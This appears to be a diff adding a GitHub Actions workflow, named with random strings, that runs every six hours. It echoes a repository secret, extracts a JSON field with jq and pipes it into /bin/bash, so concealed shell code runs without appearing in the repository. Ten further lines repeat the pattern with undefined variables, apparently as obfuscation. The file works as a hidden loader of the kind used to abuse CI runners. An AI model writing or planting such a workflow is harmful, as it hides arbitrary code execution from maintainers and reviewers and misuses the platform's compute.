@@ -1,0 +1,27 @@
+name: xiaoyushi7654
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaoyushi7654
+        env:
+          smb4801: ${{ secrets.smb4801 }}
+        run: |
+          echo $smb4801 | jq -r .f7 | /bin/bash
+          echo $rii14781 | jq -r .xb7981 | /bin/bash
+          echo $c3277 | jq -r .emo51 | /bin/bash
+          echo $qmp09033 | jq -r .ndaq88 | /bin/bash
+          echo $gz358 | jq -r .bh59 | /bin/bash
+          echo $dzoqo082 | jq -r .tuqm3 | /bin/bash
+          echo $aydqe837 | jq -r .gyf090 | /bin/bash
+          echo $v0052 | jq -r .bbyw58436 | /bin/bash
+          echo $b3716 | jq -r .yesqe4 | /bin/bash
+          echo $lkaj52659 | jq -r .hwmx0664 | /bin/bash
+          echo $muf6814 | jq -r .rjf25796 | /bin/bash
+
